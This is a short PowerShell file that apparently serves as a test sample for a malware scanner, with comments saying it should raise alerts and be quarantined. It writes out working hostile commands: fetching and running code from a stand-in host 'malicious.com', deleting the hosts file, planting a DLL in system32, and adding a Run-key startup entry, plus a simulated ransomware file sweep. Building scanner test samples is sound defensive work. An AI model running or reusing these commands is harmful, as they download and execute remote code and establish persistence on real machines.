# This is a highly suspicious PowerShell script that should trigger multiple alerts

Write-Host "Starting malicious operations..."

# Suspicious commands
Invoke-WebRequest -Uri 'http://malicious.com/payload.exe' -OutFile 'payload.exe'
Invoke-Expression(New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')

# Suspicious file operations
Remove-Item -Path "$env:SystemRoot\system32\drivers\etc\hosts" -Force
Copy-Item -Path "malicious.dll" -Destination "$env:SystemRoot\system32\" -Force

# Suspicious registry operations
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MaliciousStartup" -Value "$env:TEMP\payload.exe" -PropertyType String -Force

# Suspicious encryption operations
Write-Host "Encrypting user files..."
Get-ChildItem -Path $env:USERPROFILE -Include *.doc,*.docx,*.xls,*.xlsx,*.pdf -Recurse | ForEach-Object {
    Write-Host "Encrypting $_"
    # Simulated encryption
}

Write-Host "Malicious operations completed."
Write-Host "Your system has been compromised."

# This file should be classified as "Quarantine" by the scanner
